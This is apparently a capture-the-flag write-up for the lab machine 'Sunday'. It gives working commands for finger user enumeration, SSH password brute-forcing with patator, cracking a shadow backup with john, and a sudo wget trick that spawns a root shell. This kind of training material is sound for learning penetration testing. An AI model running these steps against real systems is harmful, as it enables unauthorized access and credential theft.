## Sunday

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.10.76 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/7a42d531-5009-45e3-8844-b2118c6167da)

<br>

Port 79 is open. We can see how to proceed with hacktricks blog.  

We can enumerate users with [this script](https://pentestmonkey.net/tools/user-enumeration/finger-user-enum).

```
perl finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76

Response:
root@10.10.10.76: root     Super-User            console      <Oct 14, 2022>..
sammy@10.10.10.76: sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13
sunny@10.10.10.76: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13
```

![scan](https://github.com/b1d0ws/OSCP/assets/58514930/9d4ff2f0-abd5-4c2a-8d3c-75485b777656)

<br>

We can login with sunny user using "sunday" as password. Remember that this machine has SSH on port 22022.  

This password could be brute forced with tools like patator.

```
patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/usr/share/seclists/Password/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed.'
```

![sshLogin](https://github.com/b1d0ws/OSCP/assets/58514930/f4569379-7cfe-484f-82dc-531f7f6eb7cf)

### Root Flag

#### Sammy User

Inside /backup there is a shadow copy file. We can unshadow this an get sammy's password.

```
unshadow passwd shadow > hashes
john hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

![backupDirectory](https://github.com/b1d0ws/OSCP/assets/58514930/ba864b21-3f8c-4b5b-8c90-71804064e319)

![unshadow](https://github.com/b1d0ws/OSCP/assets/58514930/5f34df7e-9d13-43c9-92da-cae68e371b2e)

<br>

#### Root User

On sudo -l, saammy can execute wget. Use the commands below to get root.

```
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```

![privEsc](https://github.com/b1d0ws/OSCP/assets/58514930/035c3733-2ead-424a-8424-724fac3a38c6)
